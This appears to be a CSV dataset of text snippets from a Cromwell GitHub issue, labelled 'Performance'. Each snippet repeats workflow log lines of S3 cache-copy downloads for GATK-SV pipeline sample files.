Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-61/cacheCopy/SR00c.HG02490.txt.gz; 1608597234131,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-140/cacheCopy/SR00c.NA19913.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-140/cacheCopy/SR00c.NA19913.txt.gz.tbi; 1608597236161,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-84/cacheCopy/SR00c.HG03556.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-84/cacheCopy/SR00c.HG03556.txt.gz; 1608597239225,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:81104,cache,cacheCopy,81104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz; 1608597116706,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz.tbi; 1608597118429,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-58/cacheCopy/SR00c.HG02367.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-58/cacheCopy/SR00c.HG02367.txt.gz.tbi; 1608597120193,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-147/cacheCopy/SR00c.NA20522.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:49323,cache,cacheCopy,49323,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz; 1608597404588,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-117/cacheCopy/SR00c.NA18923.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-117/cacheCopy/SR00c.NA18923.txt.gz.tbi; 1608597406434,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz.tbi; 1608597409505,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:127246,cache,cacheCopy,127246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz.tbi; 1608596962113,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz.tbi; 1608596964153,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz.tbi; 1608596966063,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:6921,cache,cacheCopy,6921,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-73/cacheCopy/SR00c.HG03009.txt.gz; 1608597045131,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz.tbi; 1608597046875,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz.tbi; 1608597049133,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:29372,cache,cacheCopy,29372,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-75/cacheCopy/SR00c.HG03099.txt.gz.tbi; 1608597072537,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz.tbi; 1608597074143,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz.tbi; 1608597076382,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:36855,cache,cacheCopy,36855,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-77/cacheCopy/SR00c.HG03111.txt.gz; 1608597466639,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-100/cacheCopy/SR00c.HG04158.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-100/cacheCopy/SR00c.HG04158.txt.gz.tbi; 1608597468522,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz.tbi; 1608597470124,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:145343,cache,cacheCopy,145343,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-78/cacheCopy/SR00c.HG03369.txt.gz; 1608597399545,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz.tbi; 1608597402775,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz; 1608597404588,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-117/cacheCopy/SR00c.NA18923.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:125998,cache,cacheCopy,125998,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-79/cacheCopy/SR00c.HG03370.txt.gz; 1608597083236,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-106/cacheCopy/SR00c.NA12340.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-106/cacheCopy/SR00c.NA12340.txt.gz.tbi; 1608597085601,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-32/cacheCopy/SR00c.HG01572.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-32/cacheCopy/SR00c.HG01572.txt.gz; 1608597087902,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-104/cacheCopy/SR00c.NA10847.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:39976,cache,cacheCopy,39976,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-88/cacheCopy/SR00c.HG03694.txt.gz; 1608597249388,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz.tbi; 1608597252335,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz; 1608597255692,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:85466,cache,cacheCopy,85466,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-90/cacheCopy/SR00c.HG03722.txt.gz; 1608596956029,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-111/cacheCopy/SR00c.NA18530.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-111/cacheCopy/SR00c.NA18530.txt.gz.tbi; 1608596958265,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz; 1608596960348,download: 